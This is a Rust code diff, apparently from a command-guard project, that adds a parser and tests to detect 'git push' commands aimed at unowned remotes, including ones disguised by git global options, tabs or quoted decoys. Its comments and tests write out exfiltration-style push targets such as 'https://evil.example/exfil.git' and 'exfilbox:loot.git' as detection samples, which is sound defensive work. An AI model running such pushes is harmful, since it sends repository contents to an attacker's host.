@@ -1106,6 +1106,68 @@ pub fn repo_from_url(url: &str) -> Option<String> {
     host_and_repo_from_url(url).map(|(_, repo)| repo)
 }
 
+/// Is this token a URL `git push` would contact — regardless of whether its
+/// owner can be determined?
+///
+/// [`host_and_repo_from_url`] answers a different question. It is an
+/// *ownership* parser: it must yield `owner/repo` to compare against an
+/// allowlist, so it returns `None` for a single-path-segment URL like
+/// `https://evil.example/exfil.git` — the ordinary shape for a self-hosted
+/// forge or a bare repo served over HTTP. A caller that reads that `None` as
+/// "not a URL" conflates two opposite situations: **a target git will reject
+/// itself** (a refspec, a typo'd remote name), where falling back to the
+/// tracking remote is correct because nothing gets pushed anywhere, and **a
+/// target git will happily push to**, where the fallback validates a different
+/// destination than the one git contacts (cadence-hooks#557).
+///
+/// So this answers only the shape question, and the caller decides ownership
+/// separately. It mirrors [`host_and_repo_from_url`]'s shape logic — scheme
+/// with a non-empty host, or the SCP form `host:path` with a path that does not
+/// start with `/` — minus the requirement that the path split into two
+/// segments.
+///
+/// **The SCP arm additionally requires the right side to look like a repo, or
+/// the left side to look like a host** — a `.git` path, a `user@`, or a dot.
+/// Accepting every `a:b` would make each colon-separated refspec URL-shaped,
+/// and `git push HEAD:main` — a token git rejects on its own — would start
+/// blocking where it used to take the tracking-remote fallback. A false block
+/// on a refspec is exactly the friction this parser exists to avoid spending.
+/// The `.git` arm is what keeps a **dotless** internal host in view:
+/// `git push exfilbox:loot.git main` reaches a host resolvable through
+/// `/etc/hosts`, a DNS search domain, or an SSH `Host` alias, and requiring a
+/// dot alone would have let exactly the single-segment shape #557 is about
+/// take the fallback.
+pub fn looks_like_push_url(candidate: &str) -> bool {
+    let trimmed = candidate.trim();
+
+    if let Some((scheme, after_scheme)) = trimmed.split_once("://") {
+        // `file://` is host-less by construction, and git pushes to it happily
+        // — so an empty host is a valid shape there, not a parse failure. A
+        // scheme-bearing URL cannot be mistaken for a local path operand, so
+        // this costs nothing that a bare path (`/srv/backup.git`) does not
+        // still keep: that stays non-URL-shaped and keeps the fallback.
+        if scheme.eq_ignore_ascii_case("file") {
+            return true;
+        }
+        let host_part = after_scheme.split('/').next().unwrap_or(after_scheme);
+        // Strip credentials (`user@host`, `token:x-oauth@host`) and port, the
+        // same order `host_and_repo_from_url` strips them.
+        let host = host_part.rsplit('@').next().unwrap_or(host_part);
+        let host = host.split(':').next().unwrap_or(host);
+        return !host.is_empty();
+    }
+
+    let Some((before_colon, after_colon)) = trimmed.split_once(':') else {
+        return false;
+    };
+    // A leading `/` after the colon is a port or an absolute path, not SCP.
+    if after_colon.is_empty() || after_colon.starts_with('/') {
+        return false;
+    }
+    let host = before_colon.rsplit('@').next().unwrap_or(before_colon);
+    before_colon.contains('@') || host.contains('.') || after_colon.ends_with(".git")
+}
+
 /// Outcome of a wall-clock-bounded subprocess run.
 ///
 /// The tri-state exists so fail-closed guard arms can tell "git answered
@@ -3262,6 +3324,55 @@ pub fn push_repository_argument(words: &[String]) -> PushDestinations {
     }
 
     found
+}
+
+/// Every `git push` the command runs, as the words that FOLLOW the `push`
+/// subcommand — one entry per push, in command order.
+///
+/// **This replaces reasoning about a push as a string.** `guard-push-remote`
+/// used to gate on the literal substring `git push` and then locate the push's
+/// arguments with `split("git push").nth(1)`, which had three faces
+/// (cadence-hooks#554), all of them real pushes to an unowned target:
+///
+/// - git's globals sit between `git` and its subcommand, so
+///   `git -C . push <url>` and `git --no-pager push <url>` never matched the
+///   literal at all. [`skip_git_global_options`] is the same walk
+///   `obsidian-trash-guard` and `prevent_secret_writes::writer_targets` already
+///   adopted for the identical gap.
+/// - the shell splits on tabs, so `git<TAB>push <url>` did not match either.
+/// - a quoted literal earlier in the line captured the split, so
+///   `echo "git push" && git push <url>` handed the walker the text *between*
+///   the two and found no target — the tracking remote was validated while git
+///   pushed elsewhere.
+///
+/// Tokenizing kills all three structurally rather than patching each spelling:
+/// a quoted `git push` is one token in an `echo`'s argument list and is never
+/// in command position, and whitespace stops being a separator the caller has
+/// to model.
+///
+/// The pre-processing is the one every executable position reads —
+/// [`executable_tokens`] then [`peel_command_runners`] — so a push behind a
+/// reserved word (`do git push …`), a group wrapper, or a runner
+/// (`sudo git push …`) resolves the same way it does at every other verb gate.
+pub fn git_push_segments(command: &str) -> Vec<Vec<String>> {
+    split_segments(command)
+        .iter()
+        .filter_map(|segment| {
+            let tokens = executable_tokens(segment);
+            let argv = peel_command_runners(&tokens);
+            if command_word(argv.first()?) != "git" {
+                return None;
+            }
+            let (subcommand, rest) = skip_git_global_options(&argv[1..]).split_first()?;
+            // `push` stays case-sensitive: only the executable word folds
+            // ([`command_word`]), because a subcommand is case-sensitive to git
+            // and inventing `PUSH` would judge a command the shell never runs.
+            if subcommand != "push" {
+                return None;
+            }
+            Some(rest.to_vec())
+        })
+        .collect()
 }
 
 /// Token-slice form of [`shell_c_argument`], so a caller that has already
@@ -6380,6 +6491,85 @@ mod tests {
     fn for_in_word_boundary() {
         // "information" contains "for" but not as a word boundary
         assert!(!LOOP_PATTERN.is_match("echo information about this"));
+    }
+
+    // --- looks_like_push_url: shape, not ownership (#557) ---
+
+    #[test]
+    fn single_segment_url_is_push_shaped_though_unownable() {
+        // The whole point: `host_and_repo_from_url` says no, this says yes, and
+        // the caller must not read the first as "not a URL".
+        assert!(looks_like_push_url("https://evil.example/exfil.git"));
+        assert!(host_and_repo_from_url("https://evil.example/exfil.git").is_none());
+        assert!(looks_like_push_url("git@evil.example:exfil.git"));
+        assert!(looks_like_push_url("evil.example:exfil.git"));
+    }
+
+    #[test]
+    fn refspec_is_not_push_shaped() {
+        // Colon-separated but no host: a token git rejects itself, which must
+        // keep the tracking-remote fallback rather than start blocking.
+        assert!(!looks_like_push_url("HEAD:main"));
+        assert!(!looks_like_push_url("refs/heads/x:refs/heads/y"));
+        assert!(!looks_like_push_url("main"));
+        assert!(!looks_like_push_url("../sibling-checkout"));
+        assert!(!looks_like_push_url("/srv/backup.git"));
+    }
+
+    #[test]
+    fn file_scheme_url_is_push_shaped_despite_an_empty_host() {
+        assert!(looks_like_push_url("file:///srv/exfil.git"));
+        assert!(host_and_repo_from_url("file:///srv/exfil.git").is_none());
+    }
+
+    #[test]
+    fn dotless_scp_host_is_push_shaped_when_the_path_names_a_repo() {
+        // An SSH `Host` alias or a search-domain hostname carries no dot, and
+        // requiring one let the exact single-segment shape #557 is about take
+        // the tracking-remote fallback.
+        assert!(looks_like_push_url("exfilbox:loot.git"));
+        // Still not a refspec: the discriminator is the `.git` path, and a
+        // branch name does not carry one.
+        assert!(!looks_like_push_url("exfilbox:loot"));
+    }
+
+    // --- git_push_segments: the push is found by parsing, not substring (#554) ---
+
+    #[test]
+    fn push_segments_see_through_globals_tabs_and_decoys() {
+        let words = |c: &str| git_push_segments(c);
+        assert_eq!(
+            words("git -c color.ui=false push https://evil.example/a/b.git main"),
+            vec![vec![
+                "https://evil.example/a/b.git".to_string(),
+                "main".to_string()
+            ]]
+        );
+        assert_eq!(
+            words("git --no-pager push origin main"),
+            vec![vec!["origin".to_string(), "main".to_string()]]
+        );
+        assert_eq!(
+            words("git\tpush origin main"),
+            vec![vec!["origin".to_string(), "main".to_string()]]
+        );
+        // The decoy is an `echo` argument, never in command position.
+        assert_eq!(
+            words(r#"echo "git push" && git push origin main"#),
+            vec![vec!["origin".to_string(), "main".to_string()]]
+        );
+    }
+
+    #[test]
+    fn push_segments_reject_non_push_commands() {
+        assert!(git_push_segments("git pull origin main").is_empty());
+        assert!(git_push_segments("echo 'push this'").is_empty());
+        // Only the executable word folds — git has no `PUSH` subcommand.
+        assert!(git_push_segments("GIT PUSH origin main").is_empty());
+        assert_eq!(
+            git_push_segments("GIT push origin main"),
+            vec![vec!["origin".to_string(), "main".to_string()]]
+        );
     }
 
     // --- push_repository_argument: git push option grammar (#550) ---
